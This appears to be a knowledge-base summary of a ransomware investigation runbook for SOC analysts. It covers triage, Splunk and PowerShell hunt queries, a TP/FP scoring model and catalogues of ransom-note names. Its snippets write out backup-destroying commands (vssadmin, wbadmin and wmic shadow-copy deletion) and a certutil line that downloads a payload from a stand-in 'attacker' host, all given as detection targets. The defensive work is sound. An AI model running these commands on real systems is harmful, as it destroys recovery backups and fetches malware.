---
title: "ransomware investigation.pdf"
type: source
tags: [incident-response, ransomware, soc, runbook, ediscovery, edr]
keywords: [ransomware, investigation runbook, triage, edr, tp vs fp, vssadmin, shadow copy, encoded powershell, mass file write, t1486]
related:
  - concepts/incident-response.md
  - concepts/malware-analysis.md
  - concepts/soc-operations.md
  - concepts/endpoint-detection-response.md
  - concepts/ransomware.md
  - concepts/threat-hunting.md
  - entities/tools/sysmon.md
  - entities/threat-actors/lockbit.md
  - entities/frameworks/mitre-attack.md
maturity: validated
read_status: read
created: 2026-05-16
updated: 2026-05-17
---

## Relations

- @concepts/incident-response.md
- @concepts/malware-analysis.md
- @concepts/soc-operations.md
- @concepts/endpoint-detection-response.md
- @concepts/ransomware.md
- @concepts/threat-hunting.md
- @entities/tools/sysmon.md
- @entities/threat-actors/lockbit.md
- @entities/frameworks/mitre-attack.md

## Raw Concept

- **Title**: RANSOMWARE INVESTIGATION RUNBOOK
- **Author**: Kumar Bineet Ranjan
- **Type**: PDF (~14-page evidence-first SOC runbook, 15 sections)
- **Location**: Google Drive — [BlueTeam Kit folder](https://drive.google.com/drive/folders/1v4dQsqYe6ekjgaoImDuU0CcEJKymx1Vs); file ID `1KIMO-0zwpIFzxQFBao0Kr1NPuldTSs7F`
- **Retrieved**: 2026-05-16
- **Pages**: ~14
- **Read-status**: read (deep-read 2026-05-17)

## Narrative

A self-contained, evidence-first SOC playbook for investigating suspected ransomware activity end-to-end — triage → collection → query → process review → TP/FP scoring → containment + recovery. The strength is the operational granularity: nearly every step lists either a Windows Event ID, a Splunk/KQL/PowerShell query, or a concrete process-abuse pattern with the matching "normal vs malicious" signal. Maps cleanly onto the SANS PICERL lifecycle (see @concepts/incident-response.md) but written in playbook form rather than as a doctrine essay.

The 15 sections, briefly:

1. **Immediate triage** — record alert metadata, decide on EDR network-isolate vs. live evidence collection, escalate or de-prioritize.
2. **Evidence collection** — EDR snapshot, Windows Security events (4688, 4663, 4624, 1103), Sysmon (1, 3, 7, 11-13), file-server audit (5145), DNS/proxy/firewall, email gateway, backup logs.
3. **SIEM/EDR queries** — concrete Splunk + KQL examples for process creation, mass file writes, VSS deletion, encoded PowerShell, C2 patterns.
4. **Processes, services, persistence** — per-binary "normal vs abuse" catalog covering powershell, cmd, certutil, bitsadmin, regsvr32/rundll32/mshta, vssadmin/wbadmin, wmic/psexec, svchost/explorer/lsass, cscript/wscript, schtasks.
5. **File system & encryption indicators** — mass renames, ransom-note filenames (`README*`, `HOW_TO_DECRYPT*`, `_HELP_INSTRUCTION*`, `DECRYPT_INSTRUCTIONS*`, `RECOVER_*`), Shannon-entropy heuristic.
6. **Shadow copies / VSS** — high-confidence signal: `vssadmin delete shadows /all /quiet`, `wbadmin delete catalog`, `wmic shadowcopy delete`.
7. **Network & IOC enrichment** — new/obscure domains, large POSTs, DNS anomalies, MITRE technique mapping (T1486 Data Encrypted for Impact, T1059 Command and Scripting Interpreter).
8. **Correlation + timeline** — CSV schema for the per-event timeline (Timestamp, Host, User, Process, Parent, PID, CommandLine, FileAction, NetDest, LogSource, Notes).
9. **TP vs FP scoring** — additive scoring model (see Snippets). Common FP causes: backup software (Veeam, Veritas), legit compression jobs, AV self-actions.
10. **TP response actions** — contain → preserve → eradicate → recover, with credential rotation + backup verification.
11. **FP handling** — document evidence, tune detection rules, allowlist signed-binary paths.
12. **Reporting** — minimum ticket fields.
13. **Cheat-sheet** — quick PowerShell + Splunk queries.
14. **Filename + service explanations** — ransom-note name catalog, encrypted-extension catalog (`.locked`, `.crypt`, `.encrypted`, `.RYK`, `.locky`, `.cerber`).
15. **Play sequence** — 10-step ordered checklist.

This is the **operational counterpart** to @concepts/incident-response.md (doctrine + lifecycle): the runbook tells you what to type, while the IR concept page tells you which lifecycle phase you're in. The hunt-time techniques (sections 3, 5, 6) overlap heavily with @sources/threat-hunting-101.md but are scoped to the ransomware-encryption verb rather than to a general hunt catalog.

Anchored as the primary source for the new @concepts/ransomware.md page. Companion source is @sources/ransomware-investigation-osint-and-hunting-overview-pt1.md (Joas, still `unread-stub`) which covers the OSINT + threat-hunting angles complementary to this runbook's detection + response focus.

## Snippets

> **Scoring model — TP vs FP** [Source: ransomware investigation.pdf §9]
>
> High-confidence indicators:
> - Confirmed mass encryption / ransom notes: **+8**
> - VSS / shadow copy deletion observed: **+5**
> - Known ransomware hash/family match: **+6**
> - C2 connections to known-malicious IP/domain: **+5**
> - Lateral spread across multiple hosts: **+4**
> - Persistence objects created (service/task/Run key): **+3**
>
> Ambiguous indicators:
> - Use of PowerShell/certutil alone: **+1**
> - Single heuristic fire with no corroboration: **+1**
>
> Interpretation: **≥12 strong TP** (full IR); **6-11 probable TP** (preserve + escalate); **≤5 likely FP**.

> **VSS / shadow-copy deletion commands attackers use** [Source: ransomware investigation.pdf §6]
> ```
> vssadmin delete shadows /all /quiet
> wbadmin delete catalog
> wmic shadowcopy delete
> ```
> Hunt these via Event ID `4688` (or Sysmon `1`) — "deleting backups is an explicit step to prevent recovery — when combined with encryption this is a very strong TP signal."

> **Splunk — mass-file-write burst detection** [Source: ransomware investigation.pdf §3]
> ```
> index=file_audit host="<HOST>" | bucket _time span=1m | stats count by _time | where count > 500
> ```
> Threshold (500/min) is environment-dependent — needs tuning against backup-window baseline.

> **PowerShell — search for ransom notes** [Source: ransomware investigation.pdf §13]
> ```
> Get-ChildItem -Path C:\ -Include "*README*","*_DECRYPT*","HOW_TO_DECRYPT*","*RECOVER*.*" -Recurse -ErrorAction SilentlyContinue | Select FullName, LastWriteTime
> ```

> **Splunk — encoded PowerShell usage** [Source: ransomware investigation.pdf §13]
> ```
> index=wineventlog EventCode=4688 Process_Command_Line="*-EncodedCommand*" OR Process_Command_Line="* -enc *"
> | table _time host user New_Process_Name Parent_Process_Name Process_Command_Line
> ```

> **certutil LOLBin pattern** [Source: ransomware investigation.pdf §4]
>
> `certutil -urlcache -split -f http://attacker/payload.exe C:\Users\...\tmp.exe` — certificate utility weaponized as a downloader. Suspicious when run by non-admin or Office parent.

> **Ransom-note filename catalog** [Source: ransomware investigation.pdf §14]
> - `README.txt`, `README_FOR_DECRYPT.txt`
> - `HOW_TO_DECRYPT_FILES.html`, `HOW_TO_RECOVER.html`
> - `_HELP_INSTRUCTION.txt`
> - `DECRYPT_INSTRUCTIONS.html`
> - `RECOVER_FILES.txt`

> **Encrypted-extension catalog (non-exhaustive)** [Source: ransomware investigation.pdf §14]
>
> `.locked`, `.crypt`, `.encrypted`, `.RYK`, `.locky`, `.cerber`, or per-family random 5-10 char extensions.

## Dead Ends

- **Shannon entropy as sole evidence** — the paper explicitly cautions: "high entropy in sample files (heuristic; encrypted files look random) ... use as one heuristic, not sole evidence." Many legitimate file formats (zip, jpeg, sqlite-WAL, certain compressed Office formats) also produce high entropy. [CONFIRMED]
- **Powering off a suspected host immediately** — destroys memory-resident keys, in-flight payloads, and process state. The runbook §1 advises: prefer EDR network-isolate first; live-memory dump *before* hard shutdown when host is business-critical. [CONFIRMED]
- **Detecting based on PowerShell use alone** — too noisy (admins use PowerShell constantly). Scoring rubric assigns "use of PowerShell/certutil alone" only **+1**. Pair with parent-process anomalies or encoded-command flags to escalate. [CONFIRMED]
